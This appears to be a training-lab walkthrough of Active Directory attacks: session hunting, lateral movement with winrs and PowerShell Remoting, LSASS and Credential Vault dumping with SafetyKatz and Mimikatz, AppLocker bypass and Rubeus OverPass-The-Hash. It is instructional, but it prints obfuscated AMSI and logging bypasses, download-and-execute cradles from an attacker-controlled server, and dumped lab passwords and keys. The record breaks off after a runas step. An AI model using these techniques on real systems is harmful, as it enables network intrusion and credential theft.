# Learning Objective 07 (Domain Privilege Escalation, Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash)

## Tasks

1. **Lateral move to a machine with local admin privileges, extract the DA encryption key hash and escalate via OverPass-The-Hash (Pass-The-Key)**
2. **Lateral move to a machine with local admin privileges and extract credentials from LSASS/Credential Vault by exploiting gaps in AppLocker GPO rules. Lateral move to another machine with local admin privileges and extract credentials from LSASS by disabling AppLocker**

---

## Attack Path Steps

1. **Lateral move to a machine with local admin privileges, extract the DA encryption key hash and escalate via OverPass-The-Hash (Pass-The-Key)**
	- **Find a Target Machine 1 `dcorp-mgmt` where a Domain Administrator has an Active Session**
	- **Access to the Target Machine 1 `dcorp-mgmt` as a Local Administrator (for Lateral Movement)**
	- **Extract the Encryption Key Hash (from the Target Machine 1 `dcorp-mgmt`) of the Target Domain Administrator**
	- **Gain Access to the DC with DA Privileges using an OverPass-The-Hash Attack (for Lateral Movement)**
2. **Lateral move to a machine with local admin privileges and extract credentials from LSASS/Credential Vault by exploiting gaps in AppLocker GPO rules. Lateral move to another machine with local admin privileges and extract credentials from LSASS by disabling AppLocker**
	- **Find a Target Machine 2 `dcorp-adminsrv` where we have Local Administrator Privileges**
	- **Access to the Target Machine 2 as a Local Administrator (for Lateral Movement)**
	- **Extract Credentials from the LSASS Process Memory (of the Target Machine 2 `dcorp-adminsrv`) by Exploiting Gaps in AppLocker GPO Rules**
	- **Extract Credentials from the Windows Credential Vault (of the Target Machine 2 `dcorp-adminsrv`) by Exploiting Gaps in AppLocker GPO Rules**
	- **Use Lateral Movement to the Target Machine 1 `dcorp-mgmt` and Extract Credentials from its LSASS Process Memory**
	- **Extract Credentials from the LSASS Process Memory (of the Target Machine 2 `dcorp-adminsrv`) Disabling AppLocker by Modifying the GPO**

---

## Solution

1. **Lateral move to a machine with local admin privileges, extract the DA encryption key hash and escalate via OverPass-The-Hash (Pass-The-Key)**

- **Find a Target Machine 1 `dcorp-mgmt` where a Domain Administrator has an Active Session**

We have access to two domain users (`student422` and `ciadmin`) and administrative access to `dcorp-adminsrv` machine (see *Learning Objective 05*). User hunting has not been fruitful as `student422`.

**Enumeration using Invoke-SessionHunter**

We can use `Invoke-SessionHunter.ps1` from the student VM to list sessions on all the remote machines.

**`Invoke-SessionHunter.ps1` queries the Remote Registry Service**, which runs by default on Windows machines, and does **not require administrative privileges**. This makes it a **low-privilege method** for identifying active user sessions without triggering security alerts.

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`cd \AD\Tools`

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`

`Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access`:
```
[+] Elapsed time: 0:0:6.559

HostName       UserSession                Access
--------       -----------                ------
dcorp-appsrv   dcorp\appadmin              False
dcorp-mgmt     dcorp\mgmtadmin             False
dcorp-mssql    dcorp\sqladmin              False
dcorp-sql1     dcorp\sql1admin             False
dcorp-std416   dcorp\student416            False
dcorp-std417   dcorp\student417            False
dcorp-std418   dcorp\student418            False
dcorp-std419   dcorp\student419            False
dcorp-std420   dcorp\student420            False
dcorp-std421   dcorp\student421            False
dcorp-std423   dcorp\student423            False
dcorp-std424   dcorp\student424            False
dcorp-std425   dcorp\student425            False
dcorp-std426   dcorp\student426            False
dcorp-std427   dcorp\student427            False
dcorp-std428   dcorp\student428            False
dcorp-std429   dcorp\student429            False
dcorp-std430   dcorp\student430            False
dcorp-std431   dcorp\student431            False
dcorp-std432   dcorp\student432            False
dcorp-std433   dcorp\student433            False
dcorp-std434   dcorp\student434            False
dcorp-stdadmin dcorp\studentadmin          False
dcorp-dc       dcorp\Administrator         False
dcorp-dc       dcorp\svcadmin              False
dcorp-mgmt🖥️   dcorp\svcadmin👤            False📌
dcorp-std426   DCORP-STD422\Administrator  False
dcorp-stdadmin DCORP-STD422\Administrator  False
dcorp-adminsrv dcorp\appadmin               True
dcorp-adminsrv dcorp\srvadmin               True
dcorp-adminsrv dcorp\websvc                 True
```

To make the above enumeration **more OPSEC friendly and avoid triggering tools like MDI**, we can query specific target machines. You need to create `servers.txt` and use the below commands.

`notepad C:\AD\Tools\servers.txt`:
```
DCORP-ADMINSRV
DCORP-APPSRV
DCORP-CI
DCORP-MGMT
DCORP-MSSQL
```

`Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access`:
```
[+] Elapsed time: 0:0:1.885

HostName       UserSession     Access
--------       -----------     ------
DCORP-APPSRV   dcorp\appadmin   False
DCORP-MGMT     dcorp\mgmtadmin  False
DCORP-MSSQL    dcorp\sqladmin   False
DCORP-MGMT🖥️   dcorp\svcadmin👤 False📌
DCORP-ADMINSRV dcorp\appadmin    True
DCORP-ADMINSRV dcorp\srvadmin    True
DCORP-ADMINSRV dcorp\websvc      True
```

Sweet! There is a domain admin (`svcadmin`) session on `dcorp-mgmt` server! We do not have access to the server but that comes later.

**Enumeration using PowerView**

We got a reverse shell on `dcorp-ci` as a local administrator (`ciadmin`) by abusing Jenkins (see *Learning Objective 05*).

Unlike `Invoke-SessionHunter`, **`Find-DomainUserLocation` typically requires higher privileges**, as it performs more extensive queries against the domain. It leverages **Active Directory and remote system queries**, which may require administrative access or special permissions to retrieve session information.

So, before of using that, we must **bypass AMSI and enhanced logging**.

First **bypass Enhanced Script Block Logging so that the AMSI bypass is not logged**. We could also use these bypasses in the initial `download-execute` cradle that we used in Jenkins.

Note: **PowerShell transcripts persist on disk, and there is no known in-memory technique to bypass their logging**.

Note that we could also paste the contents of `sbloggingbypass.txt` in place of the `download-exec` cradle.

![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)

`type C:\AD\Tools\sbloggingbypass.txt`:
```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

![HFS - sbloggingbypass.txt](./assets/screenshots/learning_objective_07_hfs_sbloggingbypass.png)

`iex (iwr http://172.16.100.22/sbloggingbypass.txt -UseBasicParsing)`

Use the below command **to bypass AMSI**.

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Now, download and execute PowerView in memory of the reverse shell and run `Find-DomainUserLocation`.

![HFS - PowerView.ps1](./assets/screenshots/learning_objective_07_hfs_powerview.png)

`iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/PowerView.ps1'))`

Use the following commands **to looks for machines where a domain admin is logged in**.

Note: `Find-DomainUserLocation` may take many minutes to check all the machines in the domain.

`Find-DomainUserLocation`:
```
UserDomain      : DCORP-CI
UserName        : Administrator
ComputerName    : dcorp-ci.dollarcorp.moneycorp.local
IPAddress       : 172.16.3.11
SessionFrom     :
SessionFromName :
LocalAdmin      :

UserDomain      : dcorp
UserName        : svcadmin👤
ComputerName    : dcorp-mgmt🖥️.dollarcorp.moneycorp.local🏛️
IPAddress       : 172.16.4.44📌
SessionFrom     :
SessionFromName :
LocalAdmin      :
```

Great! There is a domain admin session on `dcorp-mgmt` server!
🚩

- **Access to the Target Machine 1 `dcorp-mgmt` as a Local Administrator (for Lateral Movement)**

To identify a machine in the domain where `ciadmin` has local administrative access, we can use `Find-PSRemotingLocalAdminAccess.ps1`.

![HFS - Find-PSRemotingLocalAdminAccess.ps1](./assets/screenshots/learning_objective_07_hfs_findpsremotinglocaladminaccess.png)

![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)

`iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/Find-PSRemotingLocalAdminAccess.ps1'))`

`Find-PSRemotingLocalAdminAccess`:
```
dcorp-ci
dcorp-mgmt🖥️
```

So, `ciadmin` has administrative access on `dcorp-mgmt`.

Now, we can abuse this using winrs or PowerShell Remoting!

`winrs -r:dcorp-mgmt cmd /c "set computername && set username"`:
```
COMPUTERNAME=DCORP-MGMT🖥️
USERNAME=ciadmin👤
```
🚩

- **Extract the Encryption Key Hash (from the Target Machine 1 `dcorp-mgmt`) of the Target Domain Administrator**

We would now run SafetyKatz on `dcorp-mgmt` to extract credentials from it. For that, we need to copy `Loader.exe` on `dcorp-mgmt`.
Let's download `Loader.exe` on `dcorp-ci` and copy it from there to `dcorp-mgmt`. This is to avoid any downloading activity on `dcorp-mgmt`.

![HFS - Loader.exe](./assets/screenshots/learning_objective_07_hfs_loader.png)

Run the following command on the reverse shell.

`iwr http://172.16.100.22/Loader.exe -OutFile C:\Users\Public\Loader.exe`

Now, copy the `Loader.exe` to `dcorp-mgmt`.

`echo Y | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe`:
```
Overwrite \\dcorp-mgmt\C$\Users\Public\Loader.exe (Yes/No/All)? Y
C:\Users\Public\Loader.exe
1 File(s) copied
```

Using winrs, add the following port forwarding on `dcorp-mgmt` to avoid detection on `dcorp-mgmt`.

`$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22"`

Please note that we must use the `$null` variable to address output redirection issues.

To run SafetyKatz on `dcorp-mgmt`, we will download and execute it in-memory using the Loader.

![HFS -SafetyKatz.exe](./assets/screenshots/learning_objective_07_hfs_safetykatz.png)

`$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"`:
```
[SNIP]

mimikatz(commandline) # sekurlsa::evasive-keys📌

[SNIP]

Authentication Id : 0 ; 58588 (00000000:0000e4dc)
Session📌         : Service from 0📌
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/16/2025 7:43:40 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin👤
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
         * Password : *ThisisBlasphemyThisisMadness!!🔑
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011🔑
           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8

[SNIP]
```

Sweet! We got credentials of `svcadmin`, a domain administrator.
🚩

- **Gain Access to the DC with DA Privileges using an OverPass-The-Hash Attack (for Lateral Movement)**

Note that `svcadmin` is used as a service account (see  `Session` in the above output), so you can even get credentials in clear-text from lsasecrets!

Now we can use OverPass-The-Hash (aka Pass-The-Key) to authenticate as `svcadmin` by replaying its credentials.

Note that we can use whatever tool we want (Rubeus, Invoke-Mimi, SafetyKatz, etc.).

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : QSXFRIH1
[*] Domain          : FZUG6238
[*] Password        : G05M685W
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 712
[+] LUID            : 0x1581b95

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[*] Target LUID : 22551445
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x1581b95
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  UserName                 :  svcadmin🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/19/2025 4:08:05 PM
  EndTime                  :  2/20/2025 2:08:05 AM
  RenewTill                :  2/26/2025 4:08:05 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  CmkaAsHeqnhMoRtns5J0uDKQDoCRkORVDlP+4+m7XoI=
  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
```

![New spawned terminal process 1](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_1.png)

`klist`:
```
Current LogonId is 0:0x1581b95

Cached Tickets: (1)

#0>     Client: svcadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/19/2025 16:08:05 (local)
        End Time:   2/20/2025 2:08:05 (local)
        Renew Time: 2/26/2025 16:08:05 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Try accessing the domain controller from the new spawned process!

`winrs -r:dcorp-dc cmd /c "set computername && set username"`:
```
COMPUTERNAME=DCORP-DC🖥️
USERNAME=svcadmin👤
```

Note that we did not need to have direct access to `dcorp-mgmt` from the student VM.
🚩

2. **Lateral move to a machine with local admin privileges and extract credentials from LSASS/Credential Vault by exploiting gaps in AppLocker GPO rules. Lateral move to another machine with local admin privileges and extract credentials from LSASS by disabling AppLocker**

Now moving on to the next task, we need to escalate to domain admin using derivative local admin.

- **Find a Target Machine 2 `dcorp-adminsrv` where we have Local Administrator Privileges*

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`

`Find-PSRemotingLocalAdminAccess`:
```
dcorp-adminsrv🖥️
```

We have local admin on the `dcorp-adminsrv`.
🚩

- **Access to the Target Machine 2 as a Local Administrator (for Lateral Movement)**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`winrs -r:dcorp-adminsrv cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\student422>
```
🚀
🚩

- **Extract Credentials from the LSASS Process Memory (of the Target Machine 2 `dcorp-adminsrv`) by Exploiting Gaps in AppLocker GPO Rules**

You will notice that any attempt to run `Loader.exe` (to run SafetyKatz from memory) results in error "This program is blocked by group policy. For more information, contact your system administrator".
Any attempts to run Invoke-Mimi on `dcorp-adminsrv` results in errors about language mode.

**This could be because of an application allowlist on `dcorp-adminsrv`** and we drop into a **Constrained Language Mode (CLM)** when using PSRemoting.

Let's check if Applocker is configured on `dcorp-adminsrv` by querying registry keys.

Note that we are assuming that `reg.exe` is allowed to execute.

![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)

`reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2`:
```
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Appx
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Dll
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Msi
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script
```

Looks like **Applocker is configured**.

After going through the policies, we can understand that **Microsoft signed binaries and scripts are allowed for all the users but nothing else**. However, this particular rule is overly permissive!

`reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d`:
```
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
    Value    REG_SZ    <FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d"📌 Name="(Default Rule) All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder."📑 UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
```

A default rule is enabled that allows everyone to run scripts from the `C:\Program Files` folder!

We can also confirm this using PowerShell commands on `dcrop-adminsrv`.

`exit`

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Enter-PSSession dcorp-adminsrv`:
```
[dcorp-adminsrv]: PS C:\Users\student422\Documents>
```
🚀

![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)

`$ExecutionContext.SessionState.LanguageMode`:
```
ConstrainedLanguage📌
```

`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`:
```
[SNIP]

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d📌
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.📑
UserOrGroupSid      : S-1-1-0
Action              : Allow

[SNIP]
```

Here, `Everyone` can run scripts from the `Program Files` directory. That means, we can drop scripts in the `Program Files` directory there and execute them.

Also, **in the Constrained Language Mode, we cannot run scripts using dot sourcing (`. .\Invoke-Mimi.ps1`)**.

So, we must modify `Invoke-Mimi.ps1` to include the function call in the script itself and transfer the modified script (`Invoke-MimiEx-keys-std422.ps1`) to the target server.

**Create `Invoke-MimiEx-keys-std422.ps1`**

- Create a copy of `Invoke-Mimi.ps1` and rename it to `Invoke-MimiEx-keys-std422.ps1`.
- Open `Invoke-MimiEx-keys-std422.ps1` in PowerShell ISE (right click on it and click `Edit`).
- Add the below encoded value for `sekurlsa::ekeys` to the end of the file.

```powershell
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$l = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$1 = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1;

Invoke-Mimi -Command $Pwn
```

![Invoke-MimiEx-keys-std422.ps1](./assets/screenshots/learning_objective_07_invokemimiexkeysstd422.png)

On student machine run the following command from a PowerShell session.

Note that it will take several minutes for the copy process to complete.

`exit`

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-std422.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`

The file `Invoke-MimiEx-keys-std422.ps1` is copied to the `dcorp-adminsrv` server.

`dir \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`:
```
    Directory: \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   8:27 AM                Common Files
d-----          5/8/2021   8:15 AM                Internet Explorer
d-----          5/8/2021   8:15 AM                ModifiableWindowsApps
d-----        11/11/2022   9:57 AM                Windows Defender
d-----        10/25/2024  10:36 AM                Windows Defender Advanced Threat Protection
d-----          5/8/2021   9:34 AM                Windows NT
d-----          5/8/2021   8:27 AM                WindowsPowerShell
-a----         2/19/2025   1:53 PM        3063587 Invoke-MimiEx-keys-std422.ps1📌
```

`Enter-PSSession dcorp-adminsrv`:
```
[dcorp-adminsrv]: PS C:\Users\student422\Documents>
```
🚀

![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)

Now, run the modified Mimikatz script. Note that there is no dot sourcing here.

It may take a couple of minutes for the script execution to complete.

`C:\'Program Files'\Invoke-MimiEx-keys-std422.ps1`:
```
[SNIP]

mimikatz(powershell) # sekurlsa::ekeys📌

[SNIP]

Authentication Id : 0 ; 136295 (00000000:00021467)
Session           : Service from 0📌
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/16/2025 7:43:13 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1117

         * Username : appadmin👤
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
         * Password : *ActuallyTheWebServer1🔑
         * Key List :
           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb🔑
           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7
           rc4_md4           d549831a955fee51a43c83efb3928fa7
           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7

[SNIP]

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0📌
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/16/2025 7:42:59 AM
SID               : S-1-5-20

         * Username : dcorp-adminsrv$👤
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
         * Password : (null)
         * Key List :
           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51🔑
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

[SNIP]

Authentication Id : 0 ; 136296 (00000000:00021468)
Session           : Service from 0📌
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/16/2025 7:43:13 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1114

         * Username : websvc👤
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
         * Password : AServicewhichIsNotM3@nttoBe🔑
         * Key List :
           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7🔑
           aes128_hmac       86a353c1ea16a87c39e2996253211e41
           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f
           rc4_md4           cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f

[SNIP]
```

**By executing `sekurlsa::ekeys` in Mimikatz, we successfully dumped Kerberos encryption keys and credentials from LSASS memory**. This includes AES and RC4 keys for multiple accounts (`dcorp-adminsrv$`, `appadmin`, and `websvc`).
🚩

- **Extract Credentials from the Windows Credential Vault (of the Target Machine 2 `dcorp-adminsrv`) by Exploiting Gaps in AppLocker GPO Rules**

As we discussed in the class, there are other places to look for credentials.

Let's modify `Invoke-Mimi.ps1` and **look for credentials from the Windows Credential Vault**.

**Create `Invoke-MimiEx-vault-std422.ps1`**

On the student VM:
- Create a copy of `Invoke-Mimi.ps1` and rename it to `Invoke-MimiEx-vault-std422.ps1`.
- Open `Invoke-MimiEx-vault-std422.ps1` in PowerShell ISE (right click on it and click `Edit`).
- Replace `Invoke-Mimi -Command '"sekurlsa::ekeys"'` that we added earlier with `Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'`.

![Invoke-MimiEx-vault-std422.ps1](./assets/screenshots/learning_objective_07_invokemimiexvaultstd422.png)

Copy `Invoke-MimiEx-vault-std422.ps1` to `dcorp-adminsrv` and run it.

Remember that it will take several minutes for the copy process to complete.

`exit`

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Copy-Item C:\AD\Tools\Invoke-MimiEx-vault-std422.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`

`dir \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`:
```
    Directory: \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   8:27 AM                Common Files
d-----          5/8/2021   8:15 AM                Internet Explorer
d-----          5/8/2021   8:15 AM                ModifiableWindowsApps
d-----        11/11/2022   9:57 AM                Windows Defender
d-----        10/25/2024  10:36 AM                Windows Defender Advanced Threat Protection
d-----          5/8/2021   9:34 AM                Windows NT
d-----          5/8/2021   8:27 AM                WindowsPowerShell
-a----         2/19/2025   2:15 PM        3063587 Invoke-MimiEx-keys-std422.ps1
-a----         2/19/2025   2:51 PM        3063392 Invoke-MimiEx-vault-std422.ps1📌
```

`Enter-PSSession dcorp-adminsrv`:
```
[dcorp-adminsrv]: PS C:\Users\student422\Documents>
```
🚀

![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)

Now, run the script. Again, it may take a couple of minutes for the script execution to complete.

`C:\'Program Files'\Invoke-MimiEx-vault-std422.ps1`:
```
[SNIP]

mimikatz(powershell) # token::elevate📌
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM📌

604     {0;000003e7} 1 D 17413          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !📌
 * Process Token : {0;0049482c} 0 D 4804172     dcorp\student422        S-1-5-21-719815819-3726368948-3917688648-20607  (10g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 4848253     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(powershell) # vault::cred /patch📌
TargetName : Domain:batch=TaskScheduler:Task:{D1FE8F15-FC32-486B-94BC-471E4B1C1BB9} / <NULL>
UserName   : dcorp\srvadmin👤
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : TheKeyUs3ron@anyMachine!🔑
Attributes : 0

[SNIP]
```

Sweet! We got credentials for the `srvadmin` user in clear-text!
🚩

- **Use Lateral Movement to the Target Machine 1 `dcorp-mgmt` and Extract Credentials from its LSASS Process Memory**

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

Start a cmd process using runas.

`runas /user:dcorp\srvadmin /netonly cmd`:
```
Enter the password for dcorp\srvadmin:
Attempting to start cmd as user "dcorp\srvadmin" ...
```

![New spawned terminal process 2](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_2.png)

